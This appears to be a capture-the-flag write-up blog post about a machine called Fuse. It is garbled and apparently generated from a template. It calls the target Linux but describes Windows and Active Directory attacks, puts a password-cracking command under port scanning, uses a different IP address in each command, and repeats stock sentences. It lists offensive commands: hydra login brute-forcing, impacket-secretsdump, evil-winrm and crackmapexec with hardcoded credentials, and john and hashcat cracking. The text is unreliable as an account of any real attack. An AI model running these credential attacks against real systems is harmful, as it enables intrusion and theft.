---
TitleSEO: "TryHackMe — Fuse (Insane Linux) | ZureFX"
TitlePost: "TryHackMe — Fuse (Insane Linux)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Fuse. Remote Code Execution and AlwaysInstallElevated to achieve insane compromise on Linux."
Keywords: "ctf, pwntilldawn, offsec, linux"
URL: "https://zurefx.github.io/writeups/htb-fuse-155.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-fuse-155/"
Date: "2025-06-16"
Tags: "CTF, PwnTillDawn, OffSec, Linux"
Section: "writeups"
Lang: "en"
main_img: "htb-fuse-155"
Permalink: "/writeups/htb-fuse-155.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Fuse** is rated **Insane** on TryHackMe. It runs **Linux** and the IP address during this analysis was `10.117.178.247`.

### Objectives

Unconstrained delegation was enabled on the compromised machine. The service was running without proper input validation, leading to injection vulnerabilities.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The backup files contained sensitive information that should not have been accessible. The backup files contained sensitive information that should not have been accessible.

### Service Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Weak file permissions allowed modification of critical system files. Initial enumeration revealed several interesting open ports on the target.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.33.117.137
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.98.16.157 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.66.110.185 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The service account had excessive permissions assigned in Active Directory. Post-exploitation enumeration revealed a path to domain administrator privileges.

### SMB Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p21,1433,995 10.97.208.119 -oN scan.txt
evil-winrm -i 10.54.236.235 -u administrator -p 'P@ssw0rd!'
```

The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service.

## Exploitation

### Vulnerability Identification

Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target. The target system was identified as running a vulnerable version of the service.

Key finding: **Remote Code Execution**.

Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file.

### Initial Access

The service account had excessive permissions assigned in Active Directory. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.67.69.205 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.37.211.144
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Privilege Escalation

### Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files.

```bash
crackmapexec smb 10.114.164.139 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.13.168.59
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.11.56.66 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
nmap -sCV -p3306,22,3268 10.56.216.138 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.81.14.107 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.12.138.205/FUZZ
```

Command injection was possible through unsanitized user input in the search functionality. The kernel version was outdated and vulnerable to a publicly known exploit.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The service was running without proper input validation, leading to injection vulnerabilities. Weak file permissions allowed modification of critical system files.

## Summary

### Tools Used

- `ffuf`
- `rubeus`
- `chisel`
- `secretsdump`
- `john`
- `sharphound`

### Key Takeaways

- Remote Code Execution
- AlwaysInstallElevated
